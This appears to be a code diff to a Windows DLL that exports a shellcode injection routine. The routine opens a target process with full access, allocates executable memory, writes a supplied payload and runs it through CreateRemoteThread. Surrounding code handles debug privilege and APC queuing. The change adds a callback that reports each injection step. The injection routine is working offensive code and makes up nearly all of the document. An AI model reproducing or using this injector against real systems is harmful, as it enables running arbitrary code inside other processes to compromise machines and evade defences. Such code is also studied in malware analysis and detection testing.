@@ -4,9 +4,13 @@
 #include <tlhelp32.h>
 #include <sddl.h>
 
+#define STEP(cb, name, idx) if ((cb) != NULL) (cb)(name, idx)
+
 BOOL EnableDebugPrivilege();
 PSID GetProcessSID(HANDLE hProcess);
 BOOL IsSystemUser();
+
+typedef void (*StepCallback)(const char* stepName, int stepIndex);
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -56,7 +60,7 @@ BOOL QueueApcToProcess(DWORD targetPid, LPVOID payloadAddr) {
     return (queuedCount > 0);
 }
 
-extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned char* payload, unsigned int length)
+extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned char* payload, unsigned int length, StepCallback callback)
 {
     HANDLE hProcess;
     HANDLE hThread;
@@ -67,25 +71,43 @@ extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned cha
     }
 
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess)
+    if (!hProcess) {
         return -1;
+    }
+    else {
+        STEP(callback, "OpenProcess", 0);
+    }
+        
+    
 
     remoteBuffer = VirtualAllocEx(hProcess, NULL, length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (!remoteBuffer) {
         CloseHandle(hProcess);
         return -2;
     }
+    else {
+        STEP(callback, "VirtualAllocEx", 1);
+    }
+    
 
     if (!WriteProcessMemory(hProcess, remoteBuffer, payload, length, NULL)) {
         CloseHandle(hProcess);
         return -3;
     }
+    else {
+        STEP(callback, "WriteProcessMemory", 2);
+    }
+    
 
     hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
     if (!hThread) {
         CloseHandle(hProcess);
         return -4;
     }
+    else {
+        STEP(callback, "CreateRemoteThread", 3);
+    }
+    
 
     CloseHandle(hThread);
     CloseHandle(hProcess);
